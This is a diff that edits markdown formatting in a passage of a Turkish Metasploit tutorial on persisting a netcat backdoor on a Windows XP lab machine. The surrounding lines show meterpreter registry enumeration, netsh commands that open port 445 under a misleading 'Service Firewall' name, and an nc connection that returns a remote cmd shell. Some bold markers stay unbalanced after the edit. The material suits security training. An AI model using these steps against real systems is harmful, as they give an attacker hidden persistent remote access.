@@ -98,7 +98,7 @@ nc.exe programının işletim sisteminin her başladığında çalışması içi
 meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
 Enumerating: HKLM\software\microsoft\windows\currentversion\run
 
-  Values **(**3**)**:
+  Values (3):
 
     VMware Tools
     VMware User Process
@@ -134,7 +134,7 @@ meterpreter > execute -f cmd -i
 Process 1604 created.
 Channel 1 created.
 Microsoft Windows XP **[**Version 5.1.2600]
-**(**C**)** Copyright 1985-2001 Microsoft Corp.
+(C) Copyright 1985-2001 Microsoft Corp.
 C:\ >
 ```
 
@@ -152,7 +152,7 @@ Domain profile configuration:
 Operational mode                  **=** Enable
 Exception mode                    **=** Enable
 
-Standard profile configuration **(**current**)**:
+Standard profile configuration (current):
 -------------------------------------------------------------------
 Operational mode                  **=** Enable
 Exception mode                    **=** Enable
@@ -182,7 +182,7 @@ Yaptığımız işlemin hayata geçip geçmediğini kontrol edelim.
 C:\ > netsh firewall show portopening
 netsh firewall show portopening
 
-Port configuration **for **Domain profile:
+Port configuration for **Domain profile:
 Port   Protocol  Mode     Name
 -------------------------------------------------------------------
 139    TCP       Enable   NetBIOS Session Service
@@ -190,7 +190,7 @@ Port   Protocol  Mode     Name
 137    UDP       Enable   NetBIOS Name Service
 138    UDP       Enable   NetBIOS Datagram Service
 
-Port configuration **for **Standard profile:
+Port configuration for **Standard profile:
 Port   Protocol  Mode     Name
 -------------------------------------------------------------------
 445    TCP       Enable   Service Firewall
@@ -211,9 +211,9 @@ Hedef sistem tekrar başladığında `nc.exe` otomatik olarak çalışacak ve d�
 ```bash
 root@kali:~# nc -v 172.16.104.128 445
 172.16.104.128: inverse host lookup failed: Unknown server error : Connection timed out
-**(**UNKNOWN**)** **[**172.16.104.128] 445 **(**?**)** open
+(UNKNOWN) **[**172.16.104.128] 445 (?) open
 Microsoft Windows XP **[**Version 5.1.2600]
-**(**C**)** Copyright 1985-2001 Microsoft Corp.
+(C) Copyright 1985-2001 Microsoft Corp.
 
 C:\ > dir
 dir
@@ -238,8 +238,8 @@ My Documents
 Start Menu
 05/03/2009 01:25 AM 0 talltelnet.log
 05/03/2009 01:25 AM 0 talltftp.log
-4 File**(**s**)** 0 bytes
-6 Dir**(**s**)** 35,540,791,296 bytes free
+4 File(s) 0 bytes
+6 Dir(s) 35,540,791,296 bytes free
 
 C:\ >
 ```
